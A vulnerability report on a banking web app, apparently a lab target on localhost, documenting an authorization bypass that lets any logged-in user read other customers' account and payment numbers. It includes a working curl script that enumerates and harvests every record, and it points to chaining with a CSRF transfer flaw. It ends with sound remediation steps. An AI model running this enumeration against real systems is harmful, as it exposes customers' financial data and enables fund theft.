# Description

**CWE-639: Authorization Bypass Through User-Controlled Key**

The `user_profile` view takes `user_id` directly from the URL path and passes it to the backend banking service without checking that it matches the authenticated user. Any logged-in user can read the bank account data of any other user.

- Vulnerable view: `Bank/views.py:391-399` (`@login_required()` at line 391, `def user_profile(request, user_id)` at line 392)
  ```python
  @login_required()
  def user_profile(request, user_id):
      cli, sid = make_connection()
      if cli is not False and cli is not None:
          response = cli.get_user(sid, user_id)   # user_id comes from the URL, not request.user.id
          cli.close_session(sid)
          cli.close()
          return JsonResponse(response)
      return JsonResponse({"error": "unavailable"})
  ```
- Route: `Bank/urls.py:57` - `path("api/user/<int:user_id>/", views.user_profile, name="user_profile")`
- Full URL: `/banking/api/user/<int:user_id>/`

The view only checks that the caller is logged in. It never compares `user_id` with `request.user.id` and does not require the banking PIN session that protects the other banking pages. The sibling view `account` (`Bank/views.py:82`, data fetch at line 173) correctly uses `request.user.id`; this endpoint does not. Because user IDs are sequential integers, an attacker can enumerate every account. The response includes the account number, payment number, balance, and transaction history.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Register or use any ordinary account (for example `johndoe`) and log in through `/account/login/`. | Session cookie for a low-privilege user is obtained. |
| 2 | Request `/banking/api/user/1/` with the session cookie. | The response contains user ID 1's bank data (account number, payment number, balance, history), even though the caller is not user 1. |
| 3 | Iterate `user_id` from 1 upward (`/banking/api/user/2/`, `/banking/api/user/3/`, ...) and stop when responses return an error. | A full list of every user's banking record is collected. |
| 4 | Pick high-balance accounts from the results and note their `payment_number` values. | Targets are identified for follow-on attacks such as the CSRF bank transfer (CSRF_Bank_Transfer). |

# PoC

```bash
# Step 1 - log in as an ordinary user (johndoe)
curl -s -c john.cookies http://localhost:8000/account/login/ -o /dev/null
CSRF=$(grep csrftoken john.cookies | awk '{print $NF}')
curl -s -b john.cookies -c john.cookies -X POST \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "username=johndoe" \
  --data-urlencode 'password=Tr@c3d!7BxN#m9Kw2YpL' \
  -H "Referer: http://localhost:8000/account/login/" \
  http://localhost:8000/account/login/

# Step 2 - read user 1's bank data
curl -s -b john.cookies http://localhost:8000/banking/api/user/1/

# Step 3 - enumerate all user IDs and save every record
for i in $(seq 1 100); do
  curl -s -b john.cookies "http://localhost:8000/banking/api/user/${i}/" \
    | tee -a all_bank_users.json
  echo
done

# Step 4 - pull out only the financially useful fields
for i in $(seq 1 100); do
  curl -s -b john.cookies "http://localhost:8000/banking/api/user/${i}/" \
    | python3 -c 'import sys,json; d=json.load(sys.stdin); u=d.get("user",{}); \
      print(u.get("id"), u.get("account_number"), u.get("payment_number"), u.get("balance")) if d.get("success") else None'
done
```

Expected output shape for a successful request:

```json
{"success": true, "user": {"id": 1, "account_number": 2260071635394776, "payment_number": 1111111111111111, "balance": 100000.0, "history": "..."}}
```

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | High. Any logged-in user can read the account number, payment number, balance, and transaction history of every customer, including staff and administrator accounts. |
| Integrity | None directly. The endpoint is read-only. The exposed payment numbers can be used with other flaws (for example CSRF on the bank transfer) to move funds, which is an indirect integrity impact. |
| Availability | None. Enumeration is read-only and does not disrupt service, although a high request rate could load the backend banking service. |

Overall severity: **High** (CVSS 3.1 estimate: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5 Medium on the base score alone). It is rated High here because the leaked data is full financial account information for every user, it can be harvested completely with a trivial loop, and it enables fund theft when chained with the CSRF transfer flaw.

# Remediation

1. Replace the URL parameter with the authenticated user's ID. Change the view to call `cli.get_user(sid, request.user.id)` and drop `user_id` from the signature, or remove the route entirely if no client needs it.
2. If staff must read other customers' accounts, put that access behind an explicit check, for example `if request.user.id != user_id and not request.user.is_staff: return HttpResponseForbidden()`, and log each access.
3. Remove `Bank/urls.py:57` (`api/user/<int:user_id>/`) if no legitimate user-facing feature needs it.
4. Apply the same PIN-session requirement used by `account` (`Bank/views.py:82`) so that banking data is not returned without a verified banking session.
5. Add a regression test that requests another user's ID and asserts a 403 or 404 response.

# Author
WOCSA
